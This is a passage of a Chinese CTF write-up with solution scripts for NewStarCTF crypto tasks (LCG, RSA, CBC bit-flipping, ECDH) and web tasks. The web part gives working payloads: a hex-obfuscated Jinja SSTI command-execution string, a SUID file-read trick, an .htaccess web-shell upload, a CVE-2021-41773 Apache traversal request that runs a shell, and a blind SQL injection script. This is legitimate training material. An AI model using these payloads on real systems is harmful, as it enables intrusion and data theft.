step = len(FLAG) // 3
xs = [bytes_to_long(FLAG[:step]), bytes_to_long(FLAG[step:2*step]), bytes_to_long(FLAG[2*step:])]
a = getPrime(64)
b = getPrime(64)
c = getPrime(64)
a = 18038175596386287827
b = 15503291946093443851
c = 17270168560153510007
p = 307956849617421078439840909609638388517

for _ in range(10):
    new_state = (a*xs[0] + b*xs[1] + c*xs[2]) % p
    xs = xs[1:] + [new_state]
    #print(xs)
print(xs)
print(a, b, c, p)
```
exp：
```python
import Crypto
from Crypto.Util.number import *
import gmpy2

xs = [255290883651191064919890629542861653873, 221128501895959214555166046983862519384, 108104020183858879999084358722168548984]
a = 18038175596386287827
b = 15503291946093443851
c = 17270168560153510007
p = 307956849617421078439840909609638388517
t = gmpy2.invert(a,p)

for _ in range(10):
    new = (t*(xs[2]-b*xs[0]-c*xs[1]))%p
    xs = [new] + xs
flag = long_to_bytes(xs[0]).decode() + long_to_bytes(xs[1]).decode() + long_to_bytes(xs[2]).decode()
print(flag)
```
#### 代数关系
```python
from Crypto.Util.number import *
from secret import flag
p = getStrongPrime(2048)
q = getStrongPrime(2048)
n = p*q
phi = (p-1)*(q-1)
e1 = getPrime(16)
e2 = getPrime(16)
e3 = getPrime(16)
d1 = inverse(e1, phi)
d2 = inverse(e2, phi)
d3 = inverse(e3, phi)
gift_from_fallwind = d2 - d1
sp = len(flag) // 3
m1 = bytes_to_long(flag[0:sp])
m2 = bytes_to_long(flag[sp: 2*sp])
m3 = bytes_to_long(flag[2*sp:])

c1= pow(m1, e1, n)
c2= pow(m2, e2, n)
c3= pow(m3, e3, n)

print(f'n = {n}')
print(f'e1 = {e1}')
print(f'e2 = {e2}')
print(f'e3 = {e3}')
print(f'c1 = {c1}')
print(f'c2 = {c2}')
print(f'c3 = {c3}')
print(f'gift_from_fallwind = {gift_from_fallwind}')
```
```bash
n = 714592173868259951547903824656567142382519201815807137392662736000480461106944240411907971077744283561181468187349950157770542641452016168710768060100431878635594871092115167496636869765435245733216244455291669985854820686150487479060100362374214950338593785006799039892489525125499595277195821419495485780569578409849268011672935670978669183434574625404664252352238179018153026065565737180327403650490113961989352069795255693066847568569258596045200617988242378417608661573561288798387013713959291514998718810340095720086582431808535500784877130015856483311803720730193251968718389940211890886176473856457082812043712013634688479195044004890584238387779313840532514565194377261080408568578839974414957533288241409106206637332990105576057838430267703746376981194305776942499262213827373958311438790046259142383469934115411137484269094594634801601455381187640866738280586324069047262621776502056490534194678730988305691412586133810702956723819024793893235153104715079346666767828770304227597496868066084967074574249861996861449220457370695654952738759446674531850565616794250604969906523629086439326216263355721761747979532714573810102811235244618245569028203230483116293028005467298691574981713677092048315265963514382056811642161463
e1 = 42407
e2 = 42299
e3 = 64279
c1 = 147746559360802924168767659277705450630485609696398746571701418818848770182885487620535212747337538428905143459150636194921920646777706320249140903061217676389530668645622949973659702291367297066656754690100263868506461956113055815101461657779702873682097533482492493899104205046186278766341878854368500917007433940486307279045874511368494257897755625125620904196433190777249505786257092826031743302124873284619940344765699423310728402472381757497703327215054987663079091464775324695334786123993004899881875932719629531115443494782427464033199136840262965875592542948702903121840007890458510167896574258848373182376940828605330277069434815885568024582498080844909563591272397488770838751339866638704837915487427276557777372613819511517108295620835412232055690690331814390700825513053666493393942792555525632325524757429986865995789852014588602452362551730826736918369894537815766447265166762601145909581089407049818337486974627574263275878986623999208215467068257094963543761810512552366121738916812287617877452022267220425292446818899145860109087267084524150679796547645233300059224249369109340663349590685107672065377058337980842108933489505620025066451603214522163014130542079244955200533246817511795384645564870718654306017093880
c2 = 337796038485337223816475984950456810748129968181260652436798659350041388661303298381024293567858637131784295193867689006379455173201801538614335070721020735891108350570605513554850505589909457080361317990263630725721623909042708574097188905696426452814443072330582517110013425687309570310925148848467651593011914844474279987415423796247841257536637823609202705263533635281512231854231077727153008468034663708367221732104195468247696442441086937944990689793952230215990824397909249441015759060017517894957594510803336664512608128010545289784049784177611524398804382654716236024276493647659224649016999444437679713035528891917192417814659613017511330578462974624880551299057883811283033946146889355467779050967361027087080352841747836678980418533840472145655131425703508683270849398801701504340623072029235085830962038699908963834215641154556517289466852886243166207700576530398250363365976100132377349909530093158372007815925018963904011651612576427055409180229217198739845333777332027781322479300353269326257620342214186859996302004152073249996007973827806898128006273636862496964659067036495886736584255338505886284353124133030688669501417184690143652760207937780991619589875885728364937580912382631625198455389969845802240231827163
c3 = 424077500283538548695429029734927642518438524525805172568745880982861798954369892065855075306396658578715593140988681322211943800827469098807795208943724228288132152970084568728843669855312178059145983168245747282178118927927118026053179993918910256713266934916520151359475678446638810022833365506023312578408649890108868706577071610442415250434663703848788000124360027832658586954993369200881819393055860013390887044444898844318376925700215369036711799193621862491000483927756231147580685621531144248717419030824674055599055717010063636336702022163459269369324701987636772581709509640297923613071083421937504088720011643179567005037514310053762735787172663099935520119785909997287518567706508640150762285653766660798661964916169965639164375045609322144422628622388969490052285300841751657575450486389268063959043056821417358486314747981330380819421643688151487077209015995287339609841113765813462834471270766622938036101602597257457988755053683191621395473412095142041134027974560324126052952093513827172817662085883985649068515306916979488707694772473239863027480932340145990906115024722682989661592015805559935349596282010900810573490368602483785908673810154811269934225750196861258621132739166572297393817253205915435333491161203
gift_from_fallwind = 436057126906623515829218011238744316017674469205661117597268470150957758251976942445150879861108983042930734360653000973980600283904101499137333865224021780243160123582776537464659885717072177232387979780155820186376822704547514869653697300455384885557911728798950305201936973078685581794365075352341541134238714464727825137128067542739078985472265837037034067906587445615146595102552611894550913742780821268889878629177560903295511218320565910385133911886947889495561650713735268032963799756628442264275798506978864616008762967965435601210553178014009864471368535327898667309420704800396343299194692424445757081230545316510925050736165766681764700768348825662815908360495749201689747586178884303154943439689695756080847567228630187446741488386672483582019385735879376786013583105010830909520853067056907311999554079858869757789193026155282645740531423042696088661716948429683650063340097187696375083991311139748519133745606598795309849873485013934772051034350080361176801194568727665884824462291930504184029406404464952205159309484625000859491407470043008763418189126078287693565790619787102318883565462574011050013632489624673181763059753755492153825048101618871500056894854231049792292739927027237110872703608633932490764567008732
```
e1 * d1=e2 * d2 (mod phi) ==> e1 * e2 * (d2-d1)-(e1-e2)=kphi  

e1 * d4 = 1 (mod kphi) ==> d4 = d1 (mod phi)  

exp：

```python
from Crypto.Util.number import *
import gmpy2

n = 714592173868259951547903824656567142382519201815807137392662736000480461106944240411907971077744283561181468187349950157770542641452016168710768060100431878635594871092115167496636869765435245733216244455291669985854820686150487479060100362374214950338593785006799039892489525125499595277195821419495485780569578409849268011672935670978669183434574625404664252352238179018153026065565737180327403650490113961989352069795255693066847568569258596045200617988242378417608661573561288798387013713959291514998718810340095720086582431808535500784877130015856483311803720730193251968718389940211890886176473856457082812043712013634688479195044004890584238387779313840532514565194377261080408568578839974414957533288241409106206637332990105576057838430267703746376981194305776942499262213827373958311438790046259142383469934115411137484269094594634801601455381187640866738280586324069047262621776502056490534194678730988305691412586133810702956723819024793893235153104715079346666767828770304227597496868066084967074574249861996861449220457370695654952738759446674531850565616794250604969906523629086439326216263355721761747979532714573810102811235244618245569028203230483116293028005467298691574981713677092048315265963514382056811642161463
e1 = 42407
e2 = 42299
e3 = 64279
c1 = 147746559360802924168767659277705450630485609696398746571701418818848770182885487620535212747337538428905143459150636194921920646777706320249140903061217676389530668645622949973659702291367297066656754690100263868506461956113055815101461657779702873682097533482492493899104205046186278766341878854368500917007433940486307279045874511368494257897755625125620904196433190777249505786257092826031743302124873284619940344765699423310728402472381757497703327215054987663079091464775324695334786123993004899881875932719629531115443494782427464033199136840262965875592542948702903121840007890458510167896574258848373182376940828605330277069434815885568024582498080844909563591272397488770838751339866638704837915487427276557777372613819511517108295620835412232055690690331814390700825513053666493393942792555525632325524757429986865995789852014588602452362551730826736918369894537815766447265166762601145909581089407049818337486974627574263275878986623999208215467068257094963543761810512552366121738916812287617877452022267220425292446818899145860109087267084524150679796547645233300059224249369109340663349590685107672065377058337980842108933489505620025066451603214522163014130542079244955200533246817511795384645564870718654306017093880
c2 = 337796038485337223816475984950456810748129968181260652436798659350041388661303298381024293567858637131784295193867689006379455173201801538614335070721020735891108350570605513554850505589909457080361317990263630725721623909042708574097188905696426452814443072330582517110013425687309570310925148848467651593011914844474279987415423796247841257536637823609202705263533635281512231854231077727153008468034663708367221732104195468247696442441086937944990689793952230215990824397909249441015759060017517894957594510803336664512608128010545289784049784177611524398804382654716236024276493647659224649016999444437679713035528891917192417814659613017511330578462974624880551299057883811283033946146889355467779050967361027087080352841747836678980418533840472145655131425703508683270849398801701504340623072029235085830962038699908963834215641154556517289466852886243166207700576530398250363365976100132377349909530093158372007815925018963904011651612576427055409180229217198739845333777332027781322479300353269326257620342214186859996302004152073249996007973827806898128006273636862496964659067036495886736584255338505886284353124133030688669501417184690143652760207937780991619589875885728364937580912382631625198455389969845802240231827163
c3 = 424077500283538548695429029734927642518438524525805172568745880982861798954369892065855075306396658578715593140988681322211943800827469098807795208943724228288132152970084568728843669855312178059145983168245747282178118927927118026053179993918910256713266934916520151359475678446638810022833365506023312578408649890108868706577071610442415250434663703848788000124360027832658586954993369200881819393055860013390887044444898844318376925700215369036711799193621862491000483927756231147580685621531144248717419030824674055599055717010063636336702022163459269369324701987636772581709509640297923613071083421937504088720011643179567005037514310053762735787172663099935520119785909997287518567706508640150762285653766660798661964916169965639164375045609322144422628622388969490052285300841751657575450486389268063959043056821417358486314747981330380819421643688151487077209015995287339609841113765813462834471270766622938036101602597257457988755053683191621395473412095142041134027974560324126052952093513827172817662085883985649068515306916979488707694772473239863027480932340145990906115024722682989661592015805559935349596282010900810573490368602483785908673810154811269934225750196861258621132739166572297393817253205915435333491161203
g = 436057126906623515829218011238744316017674469205661117597268470150957758251976942445150879861108983042930734360653000973980600283904101499137333865224021780243160123582776537464659885717072177232387979780155820186376822704547514869653697300455384885557911728798950305201936973078685581794365075352341541134238714464727825137128067542739078985472265837037034067906587445615146595102552611894550913742780821268889878629177560903295511218320565910385133911886947889495561650713735268032963799756628442264275798506978864616008762967965435601210553178014009864471368535327898667309420704800396343299194692424445757081230545316510925050736165766681764700768348825662815908360495749201689747586178884303154943439689695756080847567228630187446741488386672483582019385735879376786013583105010830909520853067056907311999554079858869757789193026155282645740531423042696088661716948429683650063340097187696375083991311139748519133745606598795309849873485013934772051034350080361176801194568727665884824462291930504184029406404464952205159309484625000859491407470043008763418189126078287693565790619787102318883565462574011050013632489624673181763059753755492153825048101618871500056894854231049792292739927027237110872703608633932490764567008732

kphi = e1*e2*g-(e1-e2)
d1 = gmpy2.invert(e1,kphi)
d2 = gmpy2.invert(e2,kphi)
d3 = gmpy2.invert(e3,kphi)
m1 = pow(c1,d1,n)
m2 = pow(c2,d2,n)
m3 = pow(c3,d3,n)
flag = long_to_bytes(m1)+long_to_bytes(m2)+long_to_bytes(m3)
print(flag)
```
## week5
### web
#### BabySSTI_Three
方括号加hex编码绕过  

（hex编码不知道怎么用脚本写，都是手动，后面想想  

payload：

```bash
?name={{''['\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f']['\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f'][0]['\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f']()[117]['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x70\x6f\x70\x65\x6e']('\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x5f\x69\x6e\x5f\x68\x33\x72\x33\x5f\x35\x32\x64\x61\x61\x64')['re''ad']()}}}}
```
#### So Baby RCE Again
shell_exec 无回显  

ls || sleep 3，判断命令是否执行成功  

可以访问网站目录下文件，将命令执行结果输出到index.txt  

在根目录找到/ffll444aaggg，但无权访问  

发现/bin/date执行权限为s，可以suid提权，将报错输出到index.txt

```bash
?cmd=/bin/date -f /ffll444aaggg 2> index.txt||sleep 3
```
#### Give me your photo PLZ
文件上传  

传.htaccess解析，再传后门  

蚁剑连接，打开根目录flag

```bash
恭喜你做到这里，这周的比赛结束后，NewStarCTF也就告一段落了，不过，我们不希望这事你CTF旅途的终点，现在去env里面拿你真正的flag吧
```
env命令显示环境变量，得到flag
#### Unsafe Apache
[CVE-2021-41773 Apache HTTP Server 路径穿越漏洞复现 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/293172.html)  

CVE-2021-41773，开启了cgi，可构造恶意请求执行命令  

poc：

```bash
POST /cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh
# data
echo; ls /
```
exp:
```bash
POST /cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh
# data
echo; cat /ffffllllaaagggg_cc084c485d
```
curl:
```bash
curl --date "echo;cat /ffffllllaaagggg_cc084c485d" 'http://ip:port/cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh'
```
#### Final round
sql注入，无回显，非windows无法dnslog，只能时间盲注  

/x0c绕过空格  

（手动用上周的%0c成功，python中失败，怪  

python

```python
import requests
import time

headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'}
chars = 'abcdefghigklmnopqrstuvwxyz1234567890_}{ABCDEFGHJKLMNOPQRSTUVWXYZ'
flag = ''
url = "http://397dddcd-0381-4433-8612-6ea54b673db0.node4.buuoj.cn:81/comments.php"
for i in range(1,40):
    for char in chars:
        payload = "100\x0cand\x0cif(ascii(substr((select\x0ctext\x0cfrom\x0cwfy_comments\x0cwhere\x0cid=100),{0},1))={1},sleep(3),0)".format(i,ord(char))
        data = {"name":payload}
        try:
            requests.post(url,data=data,timeout=2.5)
            continue
        except:
            flag += char
            print(i," ",flag)
            break

print('flag is ' + flag)
# flag{Ju2t_let_me_s1eep_f0r_a_whi1e}
```
### crypto
#### flip-flop
```python
import os
from Crypto.Cipher import AES
from secret import FLAG
auth_major_key = os.urandom(16)

BANNER = """
Login as admin to get the flag ! 
"""

MENU = """
Enter your choice
[1] Create NewStarCTF Account
[2] Create Admin Account
[3] Login
[4] Exit
"""

print(BANNER)

while True:
    print(MENU)

    option = int(input('> '))
    if option == 1:
        auth_pt = b'NewStarCTFer____'
        user_key = os.urandom(16)
        cipher = AES.new(auth_major_key, AES.MODE_CBC, user_key)
        code = cipher.encrypt(auth_pt)
        print(f'here is your authcode: {user_key.hex() + code.hex()}')
    elif option == 2:
        print('GET OUT !!!!!!')
    elif option == 3:
        authcode = input('Enter your authcode > ')
        user_key = bytes.fromhex(authcode)[:16]
        code = bytes.fromhex(authcode)[16:]
        cipher = AES.new(auth_major_key, AES.MODE_CBC, user_key)
        auth_pt = cipher.decrypt(code)
        if auth_pt == b'AdminAdmin______':
            print(FLAG)
        elif auth_pt == b'NewStarCTFer____':
            print('Have fun!!')
        else:
            print('Who are you?')
    elif option == 4:
        print('ByeBye')
        exit(0)
    else:
        print("WTF")
```
[CBC Bit-Flipping Attack Conclusion · Automne's Shadow (ce-automne.github.io)](https://ce-automne.github.io/2019/05/23/CBC-Bit-Flipping-Attack-Conclusion/)  

AES CBC 模式的字节翻转攻击(CBC Bit-Flipping Attack)  

CBC是分组加密，前一组密文与这一组明文异或，第一组明文与偏移向量iv异或；解密类似
前一组密文翻转某一字节，这一组明文对应字节翻转  

按字节将前一组密文xor原明文xor需要的明文，则解密后可得到需要的明文  

AAB = B  

本题只有一组，直接将iv各个字节异或  

exp：

```python
from pwnlib.tubes.remote import remote

# 字节翻转攻击
def new_code(authcode):
    auth_pt = b"NewStarCTFer____"
    auth_pt2 = b"AdminAdmin______"
    user_key = bytes.fromhex(authcode)[:16].hex()
    code = bytes.fromhex(authcode)[16:]
    newuser_key = ""
    for i in range(16):
        k = hex(int(user_key[2*i:2*i+2],16)^auth_pt[i]^auth_pt2[i])[2:]
        newuser_key += k.rjust(2,'0')
    new_code = newuser_key + code.hex()
    return new_code

# 远程连接
r = remote("node4.buuoj.cn",29929)
r.sendline('1'.encode())
re = r.recv().decode()
print(re)

index = re.find(":")
authocode = re[index+2:index+66]
admincode = new_code(authocode)

r.sendline('3'.encode())
re = r.recv().decode()
print(re)

r.sendline(admincode.encode())
re = r.recv().decode()
print(re)

r.close()
```
#### An der schönen Elliptische Kurve
task.sage：
```python
from secret import FLAG, ECDH_KEY_EXCHANGE
from Crypto.Cipher import AES
from hashlib import md5
from os import urandom

iv = urandom(16)


a = 14489
b = 10289
p = 7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661

F = GF(p)
E = EllipticCurve(F, [a, b])

G = E.random_point()

my_private_key = random_prime(2^256)

shared, sender_public_key = ECDH_KEY_EXCHANGE(G, my_private_key)

key = md5(str(int(shared.xy()[0])).encode()).digest()

cipher = AES.new(key, AES.MODE_CBC, iv)
ciphretext = cipher.encrypt(FLAG)

print(a)
print(b)
print(p)
print(sender_public_key)
print(my_private_key)
print(ciphretext.hex())
print(iv.hex())
```
output.txt：
```bash
14489
10289
7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661
(1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207 : 1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459 : 1)
2549545681219766023689977461986014915946503806253877534915175093306317852773
2f65ff4a97e0e05c06eab06b58ea38a3d5b6d2a65ea4907bc46493b30081a211d7cffc872a23dbd565ef307f9492bb23
d151c04c645c3e2a8d3f1ae44589ef20
```
ECDH
[图解 ECDHE 密钥交换算法 - 小林coding - 博客园 (cnblogs.com)](https://www.cnblogs.com/xiaolincoding/p/14318338.html)  

类似DH，先创建椭圆曲线GF(p)和G，A和B双方选择a和b，得到各自公钥a*G和b*G，发送后得到共享私钥a*b*G  

本题给了B的公钥和a直接创建椭圆曲线，令G = B的公钥，则私钥 = G*a  

exp.py：

```python
from Crypto.Cipher import AES
from hashlib import md5
import tinyec.ec as ec

a = 14489
b = 10289
p = 7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661
sender_public_key = [1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207, 1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459]
my_private_key = 2549545681219766023689977461986014915946503806253877534915175093306317852773
# ECDH
s = ec.SubGroup(p, g=(sender_public_key[0],sender_public_key[1]),n=2,h=1)
c = ec.Curve(a,b,field=s)
publi_key = ec.Point(curve=c,x=sender_public_key[0],y=sender_public_key[1])
shared = my_private_key*publi_key
print(publi_key)
print(shared)
# AES
c = "2f65ff4a97e0e05c06eab06b58ea38a3d5b6d2a65ea4907bc46493b30081a211d7cffc872a23dbd565ef307f9492bb23"
iv = "d151c04c645c3e2a8d3f1ae44589ef20"
key = md5(str(int(shared.x)).encode()).digest()
cipher = AES.new(key, AES.MODE_CBC, bytes.fromhex(iv))
flag = cipher.decrypt(bytes.fromhex(c))
print(flag)
```
sage在线：[Projects - CoCalc](https://cocalc.com/projects)
exp.sage：
```python
a = 14489
b = 10289
p = 7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661
my_private_key = 2549545681219766023689977461986014915946503806253877534915175093306317852773
sender_public_key = [1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207, 1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459]
F = GF(p)
E = EllipticCurve(F,[a,b])
G = E(sender_public_key[0],sender_public_key[1])
key = (G*my_private_key).xy()[0]

from Crypto.Cipher import AES
from hashlib import md5
c = "2f65ff4a97e0e05c06eab06b58ea38a3d5b6d2a65ea4907bc46493b30081a211d7cffc872a23dbd565ef307f9492bb23"
iv = "d151c04c645c3e2a8d3f1ae44589ef20"
key = md5(str(key).encode()).digest()
cipher = AES.new(key, AES.MODE_CBC, bytes.fromhex(iv))
flag = cipher.decrypt(bytes.fromhex(c))
print(flag)
```

